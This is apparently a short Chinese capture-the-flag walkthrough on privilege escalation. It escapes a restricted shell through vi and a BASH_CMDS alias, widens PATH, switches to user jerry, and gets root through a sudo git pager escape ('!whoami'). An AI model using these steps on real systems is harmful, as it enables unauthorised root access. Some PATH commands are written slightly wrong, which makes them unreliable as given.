提权

  1. echo $PATH 看在哪个命令行

  2. ls usr/bin 确认自己可以使用什么命令(或者compgen -c)

  3. 使用vi读取flag3.txt

  4. 按下键盘a就可以调用/bin/sh命令行 BASH_CMDS[a]=/bin/sh

  5. 发现还是不能用cat

  6. 使用kali常用的命令行 /bin/bash

  7. 使用终极提权命令 把高级权限的命令行也加到自己的环境变量里

    1. export PATH=PATH:/bin
    2. export PATH=PATH:/sbin:/bin
    3. 发现可以使用cat等命令了
    4. su jerry 提权到jerry
    5. 现在在tom目录需要输入 cd ~回到jerry的home目录
    6. 需要进行最后一次提权
      1. sudo -l 以root权限查看可以使用什么命令
      2. sudo git -p –help 或者 sudo git help config (git命令可以在查看文档的时候敲命令)
      3. 出现白色条纹输入 !whoami 提权成功

  8. 输入ls /root 查看root目录下，查看flag文件
